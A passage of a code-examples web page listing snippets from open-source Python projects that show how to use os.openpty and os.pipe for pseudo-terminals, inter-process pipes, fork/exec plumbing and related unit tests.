        self.__preedit = None
        self.__preedit_visible = False
        self.__aux_string = None
        self.__aux_string_visible = False
        self.__lookup_table = None
        self.__lookup_table_visible = False

        # self.__old_sigwinch_cb = signal.signal(signal.SIGWINCH, self.__sigwinch_cb)

     
Example 8
From project pypy, under directory pypy/module/posix, in source file interp_posix.py.
Score: 10
vote
vote
def openpty(space):
    "Open a pseudo-terminal, returning open fd's for both master and slave end."
    try:
        master_fd, slave_fd = os.openpty()
    except OSError, e:
        raise wrap_oserror(space, e)
    return space.newtuple([space.wrap(master_fd), space.wrap(slave_fd)])

 
Example 9
From project asyncio-master, under directory tests, in source file test_events.py.
Score: 10
vote
vote
def test_read_pty_output(self):
        proto = MyReadPipeProto(loop=self.loop)

        master, slave = os.openpty()
        master_read_obj = io.open(master, 'rb', 0)

        @asyncio.coroutine
        def connect():
            t, p = yield from self.loop.connect_read_pipe(lambda: proto,
                                                          master_read_obj)
            self.assertIs(p, proto)
            self.assertIs(t, proto.transport)
            self.assertEqual(['INITIAL', 'CONNECTED'], proto.state)
            self.assertEqual(0, proto.nbytes)

        self.loop.run_until_complete(connect())

        os.write(slave, b'1')
        test_utils.run_until(self.loop, lambda: proto.nbytes)
        self.assertEqual(1, proto.nbytes)

        os.write(slave, b'2345')
        test_utils.run_until(self.loop, lambda: proto.nbytes >= 5)
        self.assertEqual(['INITIAL', 'CONNECTED'], proto.state)
        self.assertEqual(5, proto.nbytes)

        os.close(slave)
        self.loop.run_until_complete(proto.done)
        self.assertEqual(
            ['INITIAL', 'CONNECTED', 'EOF', 'CLOSED'], proto.state)
        # extra info is available
        self.assertIsNotNone(proto.transport.get_extra_info('pipe'))

     
Example 10
From project IncPy, under directory Lib/test, in source file test_openpty.py.
Score: 10
vote
vote
def test(self):
        master, slave = os.openpty()
        if not os.isatty(slave):
            self.fail("Slave-end of pty is not a terminal.")

        os.write(slave, 'Ping!')
        self.assertEqual(os.read(master, 1024), 'Ping!')

 
Example 11
From project imagefactory, under directory imgfac, in source file FactoryUtils.py.
Score: 10
vote
vote
def subprocess_check_output_pty(*popenargs, **kwargs):
    if 'stdout' in kwargs:
        raise ValueError('stdout argument not allowed, it will be overridden.')

    (master, slave) = os.openpty()
    process = subprocess.Popen(stdin=slave, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, *popenargs, **kwargs)

    stdout, stderr = process.communicate()
    retcode = process.poll()

    os.close(slave)
    os.close(master)

    if retcode:
        cmd = ' '.join(*popenargs)
        raise ImageFactoryException("'%s' failed(%d): %s" % (cmd, retcode, stderr))
    return (stdout, stderr, retcode)

 
Example 12
From project pycopia-master, under directory debugger/pycopia, in source file logwindow.py.
Score: 10
vote
vote
def __call__(self, *objs):
        if self._fo is None:
            masterfd, slavefd = os.openpty()
            pid = os.fork()
            if pid: # parent
                os.close(masterfd)
                self._fo = os.fdopen(slavefd, "w+b", 0)
                if self._do_stderr:
                    os.close(2)
                    os.dup2(slavefd, 2)
            else: # child
                os.close(slavefd)
                os.execlp("urxvt", "urxvt", "-pty-fd", str(masterfd))
        fo = self._fo
        fo.write("{}: ".format(datetime.now()).encode("utf-8"))
        lo = len(objs) - 1
        for i, o in enumerate(objs):
            fo.write(repr(o).encode("utf-8"))
            if i < lo:
                fo.write(b", ")
        fo.write(b"\n")


# automatic, lazy construction of DEBUG object
 
Example 13
From project pycopia-master, under directory CLI/pycopia, in source file IOurxvt.py.
Score: 10
vote
vote
def __init__(self):
        masterfd, slavefd = os.openpty()
        pid = os.fork()
        if pid: # parent
            os.close(masterfd)
            self._fo = os.fdopen(slavefd, "w+", 0)
        else: # child
            os.close(slavefd)
            os.execlp("urxvt", "urxvt", "-pty-fd", str(masterfd))
        self.mode = "rw"
        self.closed = 0
        self.softspace = 0
        # reading methods
        self.read = self._fo.read
        self.readline = self._fo.readline
        self.readlines = self._fo.readlines
        # writing methods
        self.write = self._fo.write
        self.flush = self._fo.flush
        self.writelines = self._fo.writelines

     
}

#Python os.pipe Examples
{
 Python os.pipe Examples

The following are 44 code examples for showing how to use os.pipe. They are extracted from open source Python projects. You can click  vote to vote up the examples you like, or click  vote to vote down the exmaples you don't like. Your votes will be used in our system to extract more high-quality examples.
You may also check out all available functions/classes of the module os	, or try the search function   .

Example 1
From project play1, under directory python/Lib/multiprocessing, in source file connection.py.
Score: 16
vote
vote
def Pipe(duplex=True):
        '''
        Returns pair of connection objects at either end of a pipe
        '''
        if duplex:
            s1, s2 = socket.socketpair()
            c1 = _multiprocessing.Connection(os.dup(s1.fileno()))
            c2 = _multiprocessing.Connection(os.dup(s2.fileno()))
            s1.close()
            s2.close()
        else:
            fd1, fd2 = os.pipe()
            c1 = _multiprocessing.Connection(fd1, writable=False)
            c2 = _multiprocessing.Connection(fd2, readable=False)

        return c1, c2

 

Example 2
From project eventlet, under directory eventlet, in source file tpool.py.
Score: 10
vote
vote
def setup():
    global _rfile, _wfile, _threads, _coro, _setup_already, _reqq, _rspq
    if _setup_already:
        return
    else:
        _setup_already = True
    try:
        _rpipe, _wpipe = os.pipe()
        _wfile = greenio.GreenPipe(_wpipe, 'wb', 0)
        _rfile = greenio.GreenPipe(_rpipe, 'rb', 0)
    except (ImportError, NotImplementedError):
        # This is Windows compatibility -- use a socket instead of a pipe because
        # pipes don't really exist on Windows.
        import socket
        from eventlet import util
        sock = util.__original_socket__(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(('localhost', 0))
        sock.listen(50)
        csock = util.__original_socket__(socket.AF_INET, socket.SOCK_STREAM)
        csock.connect(('localhost', sock.getsockname()[1]))
        nsock, addr = sock.accept()
        _rfile = greenio.GreenSocket(csock).makefile('rb', 0)
        _wfile = nsock.makefile('wb',0)

    _reqq = Queue(maxsize=-1)
    _rspq = Queue(maxsize=-1)
    for i in range(0,_nthreads):
        t = threading.Thread(target=tworker, name="tpool_thread_%s" % i)
        t.setDaemon(True)
        t.start()
        _threads.add(t)

    _coro = greenthread.spawn_n(tpool_trampoline)


 

Example 3
From project eventlet, under directory tests, in source file greenio_test.py.
Score: 10
vote
vote
def test_pipe(self):
        r,w = os.pipe()
        rf = greenio.GreenPipe(r, 'r');
        wf = greenio.GreenPipe(w, 'w', 0);
        def sender(f, content):
            for ch in content:
                eventlet.sleep(0.0001)
                f.write(ch)
            f.close()

        one_line = "12345\n";
        eventlet.spawn(sender, wf, one_line*5)
        for i in xrange(5):
            line = rf.readline()
            eventlet.sleep(0.01)
            self.assertEquals(line, one_line)
        self.assertEquals(rf.readline(), '')

     


 
Example 4
From project eventlet, under directory tests, in source file greenpipe_test_with_statement.py.
Score: 10
vote
vote
def test_pipe_context(self):
        # ensure using a pipe as a context actually closes it.
        r, w = os.pipe()

        r = greenio.GreenPipe(r)
        w = greenio.GreenPipe(w, 'w')

        with r:
            pass

        assert r.closed and not w.closed

        with w as f:
            assert f == w

        assert r.closed and w.closed
 

Example 5
From project hubjs, under directory tools/wafadmin, in source file pproc.py.
Score: 10
vote
vote
def _get_handles(self, stdin, stdout, stderr):
            p2cread, p2cwrite = None, None
            c2pread, c2pwrite = None, None
            errread, errwrite = None, None

            if stdin is None:
                pass
            elif stdin == PIPE:
                p2cread, p2cwrite = os.pipe()
            elif isinstance(stdin, int):
                p2cread = stdin
            else:
                p2cread = stdin.fileno()

            if stdout is None:
                pass
            elif stdout == PIPE:
                c2pread, c2pwrite = os.pipe()
            elif isinstance(stdout, int):
                c2pwrite = stdout
            else:
                c2pwrite = stdout.fileno()

            if stderr is None:
                pass
            elif stderr == PIPE:
                errread, errwrite = os.pipe()
            elif stderr == STDOUT:
                errwrite = c2pwrite
            elif isinstance(stderr, int):
                errwrite = stderr
            else:
                errwrite = stderr.fileno()

            return (p2cread, p2cwrite, c2pread, c2pwrite, errread, errwrite)

         

Example 6
From project play1, under directory python/Lib/multiprocessing, in source file forking.py.
Score: 10
vote
vote
def __init__(self, process_obj):
            # create pipe for communication with child
            rfd, wfd = os.pipe()

            # get handle for read end of the pipe and make it inheritable
            rhandle = duplicate(msvcrt.get_osfhandle(rfd), inheritable=True)
            os.close(rfd)

            # start process
            cmd = get_command_line() + [rhandle]
            cmd = ' '.join('"%s"' % x for x in cmd)
            hp, ht, pid, tid = _subprocess.CreateProcess(
                _python_exe, cmd, None, None, 1, 0, None, None, None
                )
            ht.Close()
            close(rhandle)

            # set attributes of self
            self.pid = pid
            self.returncode = None
            self._handle = hp

            # send information to child
            prep_data = get_preparation_data(process_obj._name)
            to_child = os.fdopen(wfd, 'wb')
            Popen._tls.process_handle = int(hp)
            try:
                dump(prep_data, to_child, HIGHEST_PROTOCOL)
                dump(process_obj, to_child, HIGHEST_PROTOCOL)
            finally:
                del Popen._tls.process_handle
                to_child.close()

         

Example 7
From project play1, under directory python/Lib, in source file popen2.py.
Score: 10
vote
vote
def __init__(self, cmd, capturestderr=False, bufsize=-1):
        """The parameter 'cmd' is the shell command to execute in a
        sub-process.  On UNIX, 'cmd' may be a sequence, in which case arguments
        will be passed directly to the program without shell intervention (as
        with os.spawnv()).  If 'cmd' is a string it will be passed to the shell
        (as with os.system()).   The 'capturestderr' flag, if true, specifies
        that the object should capture standard error output of the child
        process.  The default is false.  If the 'bufsize' parameter is
        specified, it specifies the size of the I/O buffers to/from the child
        process."""
        _cleanup()
        self.cmd = cmd
        p2cread, p2cwrite = os.pipe()
        c2pread, c2pwrite = os.pipe()
        if capturestderr:
            errout, errin = os.pipe()
        self.pid = os.fork()
        if self.pid == 0:
            # Child
            os.dup2(p2cread, 0)
            os.dup2(c2pwrite, 1)
            if capturestderr:
                os.dup2(errin, 2)
            self._run_child(cmd)
        os.close(p2cread)
        self.tochild = os.fdopen(p2cwrite, 'w', bufsize)
        os.close(c2pwrite)
        self.fromchild = os.fdopen(c2pread, 'r', bufsize)
        if capturestderr:
            os.close(errin)
            self.childerr = os.fdopen(errout, 'r', bufsize)
        else:
            self.childerr = None

     

Example 8
From project hh-tornado-old, under directory website/tornado, in source file ioloop.py.
Score: 10
vote
vote
def __init__(self, impl=None):
        self._impl = impl or _poll()
        if hasattr(self._impl, 'fileno'):
            self._set_close_exec(self._impl.fileno())
        self._handlers = {}
        self._events = {}
        self._callbacks = []
        self._timeouts = []
        self._running = False
        self._stopped = False
        self._blocking_signal_threshold = None

        # Create a pipe that we send bogus data to when we want to wake
        # the I/O loop when it is idle
        if os.name != 'nt':
            r, w = os.pipe()
            self._set_nonblocking(r)
            self._set_nonblocking(w)
            self._set_close_exec(r)
            self._set_close_exec(w)
            self._waker_reader = os.fdopen(r, "rb", 0)
            self._waker_writer = os.fdopen(w, "wb", 0)
        else:
            self._waker_reader = self._waker_writer = win32_support.Pipe()
            r = self._waker_writer.reader_fd
        self.add_handler(r, self._read_waker, self.READ)

     

Example 9
From project phantomjs, under directory src/breakpad/src/tools/gyp/test/lib, in source file TestCmd.py.
Score: 10
vote
vote
def __init__(self, cmd, bufsize=-1):
                    p2cread, p2cwrite = os.pipe()
                    c2pread, c2pwrite = os.pipe()
                    self.pid = os.fork()
                    if self.pid == 0:
                        # Child
                        os.dup2(p2cread, 0)
                        os.dup2(c2pwrite, 1)
                        os.dup2(c2pwrite, 2)
                        for i in range(3, popen2.MAXFD):
                            try:
                                os.close(i)
                            except: pass
                        try:
                            os.execvp(cmd[0], cmd)
                        finally:
                            os._exit(1)
                        # Shouldn't come here, I guess
                        os._exit(1)
                    os.close(p2cread)
                    self.tochild = os.fdopen(p2cwrite, 'w', bufsize)
                    os.close(c2pwrite)
                    self.fromchild = os.fdopen(c2pread, 'r', bufsize)
                    popen2._active.append(self)

             

Example 10
From project ges, under directory , in source file subprocessio.py.
Score: 10
vote
vote
def __init__(self, source):
        super(StreamFeeder,self).__init__()
        self.daemon = True
        filelike = False
        self.bytes = b''
        if type(source) in (type(''),bytes,bytearray): # string-like
            self.bytes = bytes(source)
        else: # can be either file pointer or file-like
            if type(source) in (int, long): # file pointer it is
                ## converting file descriptor (int) stdin into file-like
                try:
                    source = os.fdopen(source, 'rb', 16384)
                except:
                    pass
            # let's see if source is file-like by now
            try:
                filelike = source.read
            except:
                pass
        if not filelike and not self.bytes:
            raise TypeError("StreamFeeder's source object must be a readable file-like, a file descriptor, or a string-like.")
        self.source = source
        self.readiface, self.writeiface = os.pipe()

     

Example 11
From project gecko-dev, under directory js/src/tests/lib, in source file tasks_unix.py.
Score: 10
vote
vote
def spawn_test(test, passthrough = False):
    """Spawn one child, return a task struct."""
    if not passthrough:
        (rout, wout) = os.pipe()
        (rerr, werr) = os.pipe()

        rv = os.fork()

        # Parent.
        if rv:
            os.close(wout)
            os.close(werr)
            return Task(test, rv, rout, rerr)

        # Child.
        os.close(rout)
        os.close(rerr)

        os.dup2(wout, 1)
        os.dup2(werr, 2)

    cmd = test.get_command(test.js_cmd_prefix)
    os.execvp(cmd[0], cmd)

 

Example 12
From project basket-lib, under directory packages/mercurial/hgext, in source file pager.py.
Score: 10
vote
vote
def _runpager(p):
    if not hasattr(os, 'fork'):
        sys.stderr = sys.stdout = util.popen(p, 'wb')
        return
    fdin, fdout = os.pipe()
    pid = os.fork()
    if pid == 0:
        os.close(fdin)
        os.dup2(fdout, sys.stdout.fileno())
        os.dup2(fdout, sys.stderr.fileno())
        os.close(fdout)
        return
    os.dup2(fdin, sys.stdin.fileno())
    os.close(fdin)
    os.close(fdout)
    try:
        os.execvp('/bin/sh', ['/bin/sh', '-c', p])
    except OSError, e:
        if e.errno == errno.ENOENT:
            # no /bin/sh, try executing the pager directly
            args = shlex.split(p)
            os.execvp(args[0], args)
        else:
            raise

 

Example 13
From project basket-lib, under directory packages/ipython/IPython/kernel/core, in source file fd_redirector.py.
Score: 10
vote
vote
def start(self):
        """ Setup the redirection.
        """
        if not self.started:
            self.oldhandle = os.dup(self.fd)
            self.piper, self.pipew = os.pipe()
            os.dup2(self.pipew, self.fd)
            os.close(self.pipew)

            self.started = True

     

Example 14
From project spyce-master, under directory spyce/test, in source file support.py.
Score: 10
vote
vote
def setUp(self):
        cn = self.__class__.__name__

        kwargs = {}
        if sys.version_info.major > 2:
            # Python 3 will use a buffered io object that *always*
            # gets flushed on close, even if the buffer is empty.
            # Disable buffering to avoid ENOTCAPABLE on self.f.close()
            # TODO: write tests to exercise "normal" (i.e., unicode
            # and buffered) Python 3 files.
            kwargs['buffering'] = 0

        self.f = tempfile.TemporaryFile('wb+',
                                        prefix="spyce_test_{}_tmp".format(cn),
                                        **kwargs)
        self.pipeReadFD, self.pipeWriteFD = self.pipeFDs = os.pipe()
        self.socketSideA, self.socketSideB = self.sockets = socket.socketpair()

     

Example 15
From project anzu, under directory anzu/platform, in source file posix.py.
Score: 10
vote
vote
def __init__(self):
        r, w = os.pipe()
        _set_nonblocking(r)
        _set_nonblocking(w)
        set_close_exec(r)
        set_close_exec(w)
        self.reader = os.fdopen(r, "rb", 0)
        self.writer = os.fdopen(w, "wb", 0)

     

Example 16
From project anzu, under directory anzu/test, in source file twisted_test.py.
Score: 10
vote
vote
def setUp(self):
        self._reactor = TornadoReactor(IOLoop())
        r, w = os.pipe()
        self._set_nonblocking(r)
        self._set_nonblocking(w)
        set_close_exec(r)
        set_close_exec(w)
        self._p1 = os.fdopen(r, "rb", 0)
        self._p2 = os.fdopen(w, "wb", 0)

     

Example 17
From project coconut-shell, under directory , in source file shell.py.
Score: 10
vote
vote
def run(self, launcher, job, spec):
        pipe_read_fd, pipe_write_fd = os.pipe()
        spec1 = copy_spec(spec)
        spec2 = copy_spec(spec)
        spec1["fds"][FILENO_STDOUT] = os.fdopen(pipe_write_fd, "w")
        spec2["fds"][FILENO_STDIN] = os.fdopen(pipe_read_fd, "r")
        self._cmd1.run(launcher, job, spec1)
        self._cmd2.run(launcher, job, spec2)


 

Example 18
From project python-audio-tools, under directory audiotools, in source file __init__.py.
Score: 10
vote
vote
def __run__(self, function, args, kwargs):
        """executes the given function and arguments in a child job

        returns a (pid, reader) tuple where pid is an int of the child job
        and reader is a file object containing its piped data"""

        (pipe_read, pipe_write) = os.pipe()
        pid = os.fork()
        if (pid > 0):  # parent
            os.close(pipe_write)
            reader = os.fdopen(pipe_read, 'r')
            return (pid, reader)
        else:          # child
            os.close(pipe_read)
            writer = os.fdopen(pipe_write, 'w')
            if (kwargs is not None):
                cPickle.dump(function(*args, **kwargs), writer)
            else:
                cPickle.dump(function(*args), writer)
            sys.exit(0)

     

Example 19
From project xen, under directory tools/python/xen/util, in source file xpopen.py.
Score: 10
vote
vote
def __init__(self, cmd, capturestderr=False, bufsize=-1, passfd=(), env=None):
        """The parameter 'cmd' is the shell command to execute in a
        sub-process.  The 'capturestderr' flag, if true, specifies that
        the object should capture standard error output of the child process.
        The default is false.  If the 'bufsize' parameter is specified, it
        specifies the size of the I/O buffers to/from the child process."""
        _cleanup()
        self.passfd = passfd
        p2cread, p2cwrite = os.pipe()
        c2pread, c2pwrite = os.pipe()
        if capturestderr:
            errout, errin = os.pipe()
        self.pid = os.fork()
        if self.pid == 0:
            # Child
            os.dup2(p2cread, 0)
            os.dup2(c2pwrite, 1)
            if capturestderr:
                os.dup2(errin, 2)
            self._run_child(cmd)
        os.close(p2cread)
        self.tochild = os.fdopen(p2cwrite, 'w', bufsize)
        os.close(c2pwrite)
        self.fromchild = os.fdopen(c2pread, 'r', bufsize)
        if capturestderr:
            os.close(errin)
            self.childerr = os.fdopen(errout, 'r', bufsize)
        else:
            self.childerr = None
        _active.append(self)

     

Example 20
From project xen, under directory tools/python/xen/remus, in source file save.py.
Score: 10
vote
vote
def __init__(self, path):
        self.path = path

        self.round = 0
        self.rfd, self.wfd = os.pipe()
        self.fd = file(path, 'wb')

        # this pipe is used to notify the writer thread of checkpoints
        self.cprfd, self.cpwfd = os.pipe()

        super(CheckpointingFile, self).__init__(self.fd)

        wt = threading.Thread(target=self._wrthread, name='disk-write-thread')
        wt.setDaemon(True)
        wt.start()
        self.wt = wt

     

Example 21
From project xen, under directory tools/python/xen/xend/server, in source file relocate.py.
Score: 10
vote
vote
def op_sslreceive(self, name, _):
        if self.transport:
            self.send_reply(["ready", name])
            p2cread, p2cwrite = os.pipe()
            from xen.util import oshelp
            oshelp.fcntl_setfd_cloexec(p2cwrite, True)
            threading.Thread(target=connection.SSLSocketServerConnection.recv2fd,
                             args=(self.transport.sock, p2cwrite)).start()
            try:
                XendDomain.instance().domain_restore_fd(p2cread,
                                                        relocating=True)
            except:
                os.close(p2cread)
                os.close(p2cwrite)
                self.send_error()
                self.close()
        else:
            log.error(name + ": no transport")
            raise XendError(name + ": no transport")


 

Example 22
From project lyar-master, under directory tornado, in source file process.py.
Score: 10
vote
vote
def _pipe_cloexec():
    r, w = os.pipe()
    set_close_exec(r)
    set_close_exec(w)
    return r, w


 

Example 23
From project lyar-master, under directory tornado/test, in source file twisted_test.py.
Score: 10
vote
vote
def setUp(self):
        super(ReactorReaderWriterTest, self).setUp()
        r, w = os.pipe()
        self._set_nonblocking(r)
        self._set_nonblocking(w)
        set_close_exec(r)
        set_close_exec(w)
        self._p1 = os.fdopen(r, "rb", 0)
        self._p2 = os.fdopen(w, "wb", 0)

     

Example 24
From project lyar-master, under directory tornado/test, in source file iostream_test.py.
Score: 10
vote
vote
def test_pipe_iostream(self):
        r, w = os.pipe()

        rs = PipeIOStream(r, io_loop=self.io_loop)
        ws = PipeIOStream(w, io_loop=self.io_loop)

        ws.write(b"hel")
        ws.write(b"lo world")

        rs.read_until(b' ', callback=self.stop)
        data = self.wait()
        self.assertEqual(data, b"hello ")

        rs.read_bytes(3, self.stop)
        data = self.wait()
        self.assertEqual(data, b"wor")

        ws.close()

        rs.read_until_close(self.stop)
        data = self.wait()
        self.assertEqual(data, b"ld")

        rs.close()

     

Example 25
From project mozbuilds, under directory mozilla-build/python/Lib/multiprocessing, in source file connection.py.
Score: 10
vote
vote
def Pipe(duplex=True):
        '''
        Returns pair of connection objects at either end of a pipe
        '''
        if duplex:
            s1, s2 = socket.socketpair()
            s1.setblocking(True)
            s2.setblocking(True)
            c1 = _multiprocessing.Connection(os.dup(s1.fileno()))
            c2 = _multiprocessing.Connection(os.dup(s2.fileno()))
            s1.close()
            s2.close()
        else:
            fd1, fd2 = os.pipe()
            c1 = _multiprocessing.Connection(fd1, writable=False)
            c2 = _multiprocessing.Connection(fd2, readable=False)

        return c1, c2

 

Example 26
From project mozbuilds, under directory mozilla-build/python/Lib/test, in source file test_subprocess.py.
Score: 10
vote
vote
def test_communicate_pipe_buf(self):
        # communicate() with writes larger than pipe_buf
        # This test will probably deadlock rather than fail, if
        # communicate() does not work properly.
        x, y = os.pipe()
        if mswindows:
            pipe_buf = 512
        else:
            pipe_buf = os.fpathconf(x, "PC_PIPE_BUF")
        os.close(x)
        os.close(y)
        p = subprocess.Popen([sys.executable, "-c",
                          'import sys,os;'
                          'sys.stdout.write(sys.stdin.read(47));'
                          'sys.stderr.write("xyz"*%d);'
                          'sys.stdout.write(sys.stdin.read())' % pipe_buf],
                         stdin=subprocess.PIPE,
                         stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE)
        self.addCleanup(p.stdout.close)
        self.addCleanup(p.stderr.close)
        self.addCleanup(p.stdin.close)
        string_to_write = "abc"*pipe_buf
        (stdout, stderr) = p.communicate(string_to_write)
        self.assertEqual(stdout, string_to_write)

     

Example 27
From project sinanet.gelso, under directory PasteScript-1.7.5-py2.7.egg/paste/script/util, in source file subprocess24.py.
Score: 8
vote
vote
def _get_handles(self, stdin, stdout, stderr):
            """Construct and return tupel with IO objects:
            p2cread, p2cwrite, c2pread, c2pwrite, errread, errwrite
            """
            p2cread, p2cwrite = None, None
            c2pread, c2pwrite = None, None
            errread, errwrite = None, None

            if stdin == None:
                pass
            elif stdin == PIPE:
                p2cread, p2cwrite = os.pipe()
            elif type(stdin) == types.IntType:
                p2cread = stdin
            else:
                # Assuming file-like object
                p2cread = stdin.fileno()

            if stdout == None:
                pass
            elif stdout == PIPE:
                c2pread, c2pwrite = os.pipe()
            elif type(stdout) == types.IntType:
                c2pwrite = stdout
            else:
                # Assuming file-like object
                c2pwrite = stdout.fileno()

            if stderr == None:
                pass
            elif stderr == PIPE:
                errread, errwrite = os.pipe()
            elif stderr == STDOUT:
                errwrite = c2pwrite
            elif type(stderr) == types.IntType:
                errwrite = stderr
            else:
                # Assuming file-like object
                errwrite = stderr.fileno()

            return (p2cread, p2cwrite,
                    c2pread, c2pwrite,
                    errread, errwrite)


         

Example 28
From project hipl, under directory hipfwmi, in source file FirewallController.py.
Score: 8
vote
vote
def start_management_logic(self):
        """Start a child process and run ManagementLogic in it.

        Creates a pipe to communicate with the child process.
        """
        parent_in, child_out = os.pipe()

        pid = os.fork()
        if pid == 0:
            # This block is executed within the management logic's process.
            # Close unneeded file descriptors.
            os.close(parent_in)
            os.dup2(child_out, 1)
            os.close(child_out)
            # Redirect sys.stdout to the fresh child-parent-pipe.
            sys.stdout = os.fdopen(1, 'w')

            try:
                try:
                    import ManagementLogic
                    mgmtlogic = ManagementLogic.ManagementLogic(
                        self.listeninterface, self.listenport,
                        self.fwrulefile, self.keydir)
                    syslog.syslog('ManagementLogic started.')
                    # Drop root privileges (group first, then uid)
                    os.setgid(self.gid)
                    os.setuid(self.pid)
                    mgmtlogic.enable_debugging()
                    mgmtlogic.run()
#                except StandardException, e:
#                    syslog.syslog('Management Logic failed: %s' % e)
                except Exception, e:
                    # temporary hack to improve logging during developement
                    import traceback
                    f = open('/tmp/traceback', 'w')
                    traceback.print_exc(file=f)
                    f.close()
                    syslog.syslog("APUVA, APUVA, APUVA")
            finally:
                syslog.syslog('Closing down.')
                syslog.closelog()
                sys.exit(0)

        else:
            # This block is executed within the firewall controller's process
            self.mgmtlogic_in = os.fdopen(parent_in, 'r', 1)
            os.close(child_out)

     

Example 29
From project hubjs, under directory tools/scons/scons-local-1.2.0/SCons/compat, in source file _scons_subprocess.py.
Score: 8
vote
vote
def _get_handles(self, stdin, stdout, stderr):
            """Construct and return tupel with IO objects:
            p2cread, p2cwrite, c2pread, c2pwrite, errread, errwrite
            """
            p2cread, p2cwrite = None, None
            c2pread, c2pwrite = None, None
            errread, errwrite = None, None

            if stdin is None:
                pass
            elif stdin == PIPE:
                p2cread, p2cwrite = os.pipe()
            elif is_int(stdin):
                p2cread = stdin
            else:
                # Assuming file-like object
                p2cread = stdin.fileno()

            if stdout is None:
                pass
            elif stdout == PIPE:
                c2pread, c2pwrite = os.pipe()
            elif is_int(stdout):
                c2pwrite = stdout
            else:
                # Assuming file-like object
                c2pwrite = stdout.fileno()

            if stderr is None:
                pass
            elif stderr == PIPE:
                errread, errwrite = os.pipe()
            elif stderr == STDOUT:
                errwrite = c2pwrite
            elif is_int(stderr):
                errwrite = stderr
            else:
                # Assuming file-like object
                errwrite = stderr.fileno()

            return (p2cread, p2cwrite,
                    c2pread, c2pwrite,
                    errread, errwrite)


         

Example 30
From project hubjs, under directory tools/scons/scons-local-1.2.0/SCons/Platform, in source file posix.py.
Score: 8
vote
vote
def exec_piped_fork(l, env, stdout, stderr):
    # spawn using fork / exec and providing a pipe for the command's
    # stdout / stderr stream
    if stdout != stderr:
        (rFdOut, wFdOut) = os.pipe()
        (rFdErr, wFdErr) = os.pipe()
    else:
        (rFdOut, wFdOut) = os.pipe()
        rFdErr = rFdOut
        wFdErr = wFdOut
    # do the fork
    pid = os.fork()
    if not pid:
        # Child process
        os.close( rFdOut )
        if rFdOut != rFdErr:
            os.close( rFdErr )
        os.dup2( wFdOut, 1 ) # is there some symbolic way to do that ?
        os.dup2( wFdErr, 2 )
        os.close( wFdOut )
        if stdout != stderr:
            os.close( wFdErr )
        exitval = 127
        try:
            os.execvpe(l[0], l, env)
        except OSError, e:
            exitval = exitvalmap.get(e[0], e[0])
            stderr.write("scons: %s: %s\n" % (l[0], e[1]))
        os._exit(exitval)
    else:
        # Parent process
        pid, stat = os.waitpid(pid, 0)
        os.close( wFdOut )
        if stdout != stderr:
            os.close( wFdErr )
        childOut = os.fdopen( rFdOut )
        if stdout != stderr:
            childErr = os.fdopen( rFdErr )
        else:
            childErr = childOut
        process_cmd_output(childOut, childErr, stdout, stderr)
        os.close( rFdOut )
        if stdout != stderr:
            os.close( rFdErr )
        if stat & 0xff:
            return stat | 0x80
        return stat >> 8

 

Example 31
From project play1, under directory python/Lib, in source file subprocess.py.
Score: 8
vote
vote
def _get_handles(self, stdin, stdout, stderr):
            """Construct and return tupel with IO objects:
            p2cread, p2cwrite, c2pread, c2pwrite, errread, errwrite
            """
            p2cread, p2cwrite = None, None
            c2pread, c2pwrite = None, None
            errread, errwrite = None, None

            if stdin is None:
                pass
            elif stdin == PIPE:
                p2cread, p2cwrite = os.pipe()
            elif isinstance(stdin, int):
                p2cread = stdin
            else:
                # Assuming file-like object
                p2cread = stdin.fileno()

            if stdout is None:
                pass
            elif stdout == PIPE:
                c2pread, c2pwrite = os.pipe()
            elif isinstance(stdout, int):
                c2pwrite = stdout
            else:
                # Assuming file-like object
                c2pwrite = stdout.fileno()

            if stderr is None:
                pass
            elif stderr == PIPE:
                errread, errwrite = os.pipe()
            elif stderr == STDOUT:
                errwrite = c2pwrite
            elif isinstance(stderr, int):
                errwrite = stderr
            else:
                # Assuming file-like object
                errwrite = stderr.fileno()

            return (p2cread, p2cwrite,
                    c2pread, c2pwrite,
                    errread, errwrite)


         

Example 32
From project gecko-dev, under directory media/webrtc/trunk/build/android/pylib, in source file chrome_test_server_spawner.py.
Score: 8
vote
vote
def _GenerateCommandLineArguments(self):
    """Generates the command line to run the test server.

    Note that all options are processed by following the definitions in
    testserver.py.
    """
    if self.command_line:
      return
    # The following arguments must exist.
    type_cmd = _GetServerTypeCommandLine(self.arguments['server-type'])
    if type_cmd:
      self.command_line.append(type_cmd)
    self.command_line.append('--port=%d' % self.host_port)
    # Use a pipe to get the port given by the instance of Python test server
    # if the test does not specify the port.
    if self.host_port == 0:
      (self.pipe_in, self.pipe_out) = os.pipe()
      self.command_line.append('--startup-pipe=%d' % self.pipe_out)
    self.command_line.append('--host=%s' % self.arguments['host'])
    data_dir = self.arguments['data-dir'] or 'chrome/test/data'
    if not os.path.isabs(data_dir):
      data_dir = os.path.join(constants.CHROME_DIR, data_dir)
    self.command_line.append('--data-dir=%s' % data_dir)
    # The following arguments are optional depending on the individual test.
    if self.arguments.has_key('log-to-console'):
      self.command_line.append('--log-to-console')
    if self.arguments.has_key('auth-token'):
      self.command_line.append('--auth-token=%s' % self.arguments['auth-token'])
    if self.arguments.has_key('https'):
      self.command_line.append('--https')
      if self.arguments.has_key('cert-and-key-file'):
        self.command_line.append('--cert-and-key-file=%s' % os.path.join(
            constants.CHROME_DIR, self.arguments['cert-and-key-file']))
      if self.arguments.has_key('ocsp'):
        self.command_line.append('--ocsp=%s' % self.arguments['ocsp'])
      if self.arguments.has_key('https-record-resume'):
        self.command_line.append('--https-record-resume')
      if self.arguments.has_key('ssl-client-auth'):
        self.command_line.append('--ssl-client-auth')
      if self.arguments.has_key('tls-intolerant'):
        self.command_line.append('--tls-intolerant=%s' %
                                 self.arguments['tls-intolerant'])
      if self.arguments.has_key('ssl-client-ca'):
        for ca in self.arguments['ssl-client-ca']:
          self.command_line.append('--ssl-client-ca=%s' %
                                   os.path.join(constants.CHROME_DIR, ca))
      if self.arguments.has_key('ssl-bulk-cipher'):
        for bulk_cipher in self.arguments['ssl-bulk-cipher']:
          self.command_line.append('--ssl-bulk-cipher=%s' % bulk_cipher)

   

Example 33
From project spyder-master, under directory spyderlib, in source file interpreter.py.
Score: 8
vote
vote
def __init__(self, namespace=None, exitfunc=None,
                 Output=None, WidgetProxy=None, debug=False):
        """
        namespace: locals send to InteractiveConsole object
        commands: list of commands executed at startup
        """
        InteractiveConsole.__init__(self, namespace)
        threading.Thread.__init__(self)
        
